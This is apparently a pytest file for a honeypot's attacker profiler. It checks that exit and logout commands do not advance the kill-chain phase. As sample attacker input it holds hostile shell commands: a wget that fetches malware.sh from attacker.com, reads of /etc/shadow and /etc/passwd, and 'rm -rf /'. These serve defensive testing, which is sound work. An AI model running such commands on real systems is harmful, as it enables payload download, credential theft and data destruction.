import asyncio
import pytest
from doppel.analytics.profiler import (
    AttackerProfiler,
    ProfilerState,
    is_exit_command,
    PHASE_ORDER,
)


def test_is_exit_command_helper():
    """Verify is_exit_command safely handles variations and rejects normal commands."""
    assert is_exit_command("exit") is True
    assert is_exit_command(" EXIT ") is True
    assert is_exit_command("Logout") is True
    assert is_exit_command(" logout ") is True
    assert is_exit_command("  LOGOUT  \n") is True
    assert is_exit_command("\texit\r\n") is True
    assert is_exit_command("exit 0") is True
    assert is_exit_command("exit 1") is True
    assert is_exit_command("EXIT 255") is True
    assert is_exit_command("logout 0") is True

    # Static method alias on AttackerProfiler
    assert AttackerProfiler._is_exit_command("exit") is True
    assert AttackerProfiler._is_exit_command("logout") is True

    # Non-exit or invalid commands
    assert is_exit_command(None) is False
    assert is_exit_command("") is False
    assert is_exit_command("   ") is False
    assert is_exit_command("whoami") is False
    assert is_exit_command("sudo su") is False
    assert is_exit_command("cat /etc/passwd; exit") is False
    assert is_exit_command("exit; cat /etc/passwd") is False
    assert is_exit_command("exit_session") is False
    assert is_exit_command("echo exit") is False
    assert is_exit_command("gcc exit.c") is False
    assert is_exit_command("exit --help") is False


def test_exit_does_not_advance_attack_phase():
    """Verify exit command never advances the attack phase even with high-severity tactics."""
    profiler = AttackerProfiler()
    state = ProfilerState()
    assert state.current_phase == "Reconnaissance"
    assert state.current_phase_index == 0

    # exit with Defense Evasion tactic (which normally maps to Exploitation)
    updated_state, event = profiler.record_command(
        state=state,
        command="exit",
        tactics=["Defense Evasion"],
    )

    assert event is None
    assert updated_state.current_phase == "Reconnaissance"
    assert updated_state.current_phase_index == 0
    assert len(updated_state.phase_history) == 0

    # exit with Impact tactic (highest phase)
    updated_state, event = profiler.record_command(
        state=updated_state,
        command="exit",
        tactics=["Impact"],
    )

    assert event is None
    assert updated_state.current_phase == "Reconnaissance"
    assert updated_state.current_phase_index == 0
    assert len(updated_state.phase_history) == 0


def test_logout_does_not_advance_attack_phase():
    """Verify logout command preserves current attack phase and generates no event."""
    profiler = AttackerProfiler()
    state = ProfilerState(
        current_phase="Credential Access",
        current_phase_index=PHASE_ORDER.index("Credential Access"),
    )

    updated_state, event = profiler.record_command(
        state=state,
        command="logout",
        tactics=["Exfiltration", "Impact"],
    )

    assert event is None
    assert updated_state.current_phase == "Credential Access"
    assert updated_state.current_phase_index == PHASE_ORDER.index("Credential Access")
    assert len(updated_state.phase_history) == 0


def test_case_and_whitespace_variations():
    """Verify case and whitespace variations of exit and logout are safely handled."""
    profiler = AttackerProfiler()

    variants = [
        "exit",
        " EXIT ",
        "Logout",
        " logout ",
        "  exit  ",
        "\texit\n",
        "LOGOUT",
        "  LOGOUT\t",
        "Exit 0",
        " logout 1 ",
    ]

    for variant in variants:
        state = ProfilerState(
            current_phase="Exploitation",
            current_phase_index=PHASE_ORDER.index("Exploitation"),
        )

        # _detect_phase should return None
        detected = profiler._detect_phase(variant, ["Impact", "Exfiltration"])
        assert detected is None, f"Expected None for {variant!r}, got {detected}"

        # _update_phase should return None and preserve state
        event = profiler._update_phase(state, variant, ["Impact", "Exfiltration"])
        assert event is None, f"Expected no event for {variant!r}, got {event}"
        assert state.current_phase == "Exploitation"
        assert state.current_phase_index == PHASE_ORDER.index("Exploitation")
        assert len(state.phase_history) == 0

        # record_command should return no phase event
        updated_state, rec_event = profiler.record_command(
            state=state,
            command=variant,
            tactics=["Impact"],
        )
        assert rec_event is None, f"Expected no phase event for {variant!r}"
        assert updated_state.current_phase == "Exploitation"


def test_no_forward_phase_transition_event_for_exit_commands():
    """Verify no forward phase transition event is created across different kill-chain phases."""
    profiler = AttackerProfiler()

    test_phases = ["Reconnaissance", "Weaponization", "Exploitation", "Exfiltration"]
    for phase_name in test_phases:
        idx = PHASE_ORDER.index(phase_name)
        state = ProfilerState(current_phase=phase_name, current_phase_index=idx)

        for exit_cmd in ("exit", " EXIT ", "Logout", " logout "):
            event = profiler._update_phase(state, exit_cmd, ["Impact"])
            assert event is None
            assert state.current_phase == phase_name
            assert state.current_phase_index == idx
            assert len(state.phase_history) == 0


def test_normal_attack_commands_advance_phase_as_expected():
    """Verify normal attack commands update phase correctly while exit commands preserve phase."""
    profiler = AttackerProfiler()
    state = ProfilerState()
    assert state.current_phase == "Reconnaissance"

    # 1. Weaponization via tactic
    state, ev1 = profiler.record_command(
        state=state,
        command="wget http://attacker.com/malware.sh",
        tactics=["Resource Development"],
    )
    assert ev1 is not None
    assert ev1["from_phase"] == "Reconnaissance"
    assert ev1["to_phase"] == "Weaponization"
    assert state.current_phase == "Weaponization"

    # 2. Exit command does not advance phase
    state, ev2 = profiler.record_command(
        state=state,
        command=" EXIT ",
        tactics=["Defense Evasion"],
    )
    assert ev2 is None
    assert state.current_phase == "Weaponization"

    # 3. Exploitation via command pattern fallback
    state, ev3 = profiler.record_command(
        state=state,
        command="sudo su -",
        tactics=[],
    )
    assert ev3 is not None
    assert ev3["from_phase"] == "Weaponization"
    assert ev3["to_phase"] == "Exploitation"
    assert state.current_phase == "Exploitation"

    # 4. Logout command does not advance phase
    state, ev4 = profiler.record_command(
        state=state,
        command="logout",
        tactics=["Impact"],
    )
    assert ev4 is None
    assert state.current_phase == "Exploitation"

    # 5. Credential Access via tactic
    state, ev5 = profiler.record_command(
        state=state,
        command="cat /etc/shadow",
        tactics=["Credential Access"],
    )
    assert ev5 is not None
    assert ev5["from_phase"] == "Exploitation"
    assert ev5["to_phase"] == "Credential Access"
    assert state.current_phase == "Credential Access"

    # 6. Another variation of exit
    state, ev6 = profiler.record_command(
        state=state,
        command=" logout ",
        tactics=["Impact"],
    )
    assert ev6 is None
    assert state.current_phase == "Credential Access"

    # 7. Impact via command pattern
    state, ev7 = profiler.record_command(
        state=state,
        command="rm -rf /",
        tactics=["Impact"],
    )
    assert ev7 is not None
    assert ev7["from_phase"] == "Credential Access"
    assert ev7["to_phase"] == "Impact"
    assert state.current_phase == "Impact"

    # Verify history only contains genuine attack phase transitions
    assert len(state.phase_history) == 4
    recorded_triggers = [h["triggered_by"] for h in state.phase_history]
    assert "wget http://attacker.com/malware.sh" in recorded_triggers[0]
    assert "sudo su -" in recorded_triggers[1]
    assert "cat /etc/shadow" in recorded_triggers[2]
    assert "rm -rf /" in recorded_triggers[3]

    for h in state.phase_history:
        assert h["triggered_by"].strip().lower() not in ("exit", "logout")


@pytest.mark.asyncio
async def test_session_manager_exit_commands_integration(tmp_path):
    """Verify SessionManager does not advance attack phase or emit phase transitions on exit."""
    import os
    import tempfile
    from doppel.config import DoppelConfig
    from doppel.ai.llm_client import LLMClient
    from doppel.ai.deception_engine import DeceptionEngine
    from doppel.sandbox.docker_manager import DockerSandboxManager
    from doppel.router.hybrid_router import HybridRouter
    from doppel.analytics.db import TelemetryDB
    from doppel.analytics.observer import ThreatObserver
    from doppel.analytics.reporter import IncidentReporter
    from doppel.core.session_manager import SessionManager

    db_path = str(tmp_path / "test_telemetry.db")
    reports_dir = str(tmp_path / "reports")

    config = DoppelConfig()
    config.llm.mock_mode = True
    config.sandbox.enabled = False
    config.deception.simulate_latency = False
    config.analytics.db_path = db_path
    config.analytics.reports_dir = reports_dir

    llm_client = LLMClient(mock_mode=True)
    deception_engine = DeceptionEngine(llm_client)
    sandbox_manager = DockerSandboxManager(enabled=False)
    router = HybridRouter(sandbox_available=False)
    db = TelemetryDB(db_path=db_path)
    await db.initialize()
    observer = ThreatObserver(llm_client, db)
    reporter = IncidentReporter(llm_client, db, reports_dir=reports_dir)

    session_mgr = SessionManager(
        config=config,
        deception_engine=deception_engine,
        sandbox_manager=sandbox_manager,
        router=router,
        db=db,
        observer=observer,
        reporter=reporter,
    )

    notifications = []
    session_mgr.register_event_listener(lambda evt, data: notifications.append((evt, data)))

    session = await session_mgr.create_session(
        remote_ip="192.168.1.100",
        remote_port=44222,
        username="ubuntu",
        password="testpassword",
    )

    assert session.profiler_state.current_phase == "Reconnaissance"

    # Process exit and logout variations before any elevation
    for exit_cmd in ("exit", " EXIT ", "Logout", " logout "):
        await session_mgr.process_command(session.session_id, exit_cmd)
        await asyncio.sleep(0.05)
        assert session.profiler_state.current_phase == "Reconnaissance"

    # Check that no phase_transition notifications were fired
    phase_events = [n for n in notifications if n[0] == "phase_transition"]
    assert len(phase_events) == 0

    # Fast-path command with Defense Evasion tactic advances phase to Exploitation
    await session_mgr.process_command(session.session_id, "clear")
    await asyncio.sleep(0.05)

    # Phase should advance on normal command
    assert session.profiler_state.current_phase == "Exploitation"
    phase_events = [n for n in notifications if n[0] == "phase_transition"]
    assert len(phase_events) == 1
    assert phase_events[0][1]["to_phase"] == "Exploitation"

    # Now exit command (with or without elevation) does NOT advance phase
    await session_mgr.process_command(session.session_id, "exit")
    await asyncio.sleep(0.05)

    # Phase must be preserved at Exploitation, NOT advanced
    assert session.profiler_state.current_phase == "Exploitation"
    phase_events = [n for n in notifications if n[0] == "phase_transition"]
    assert len(phase_events) == 1  # Still exactly 1 from earlier

    # Clean up session
    await session_mgr.close_session(session.session_id, generate_report=False)



def test_exit_is_not_tagged_as_a_technique():
    from doppel.analytics.observer import ThreatObserver
    observer = ThreatObserver(llm_client=None, db=None)
    for cmd in ("exit", " LOGOUT ", "exit 0"):
        meta = observer.match_fast_path(cmd)
        assert meta["technique_id"] is None and meta["threat_score"] == 0 and meta["tactics"] == []
    assert observer.match_fast_path("exit; rm -rf /tmp/x") is None
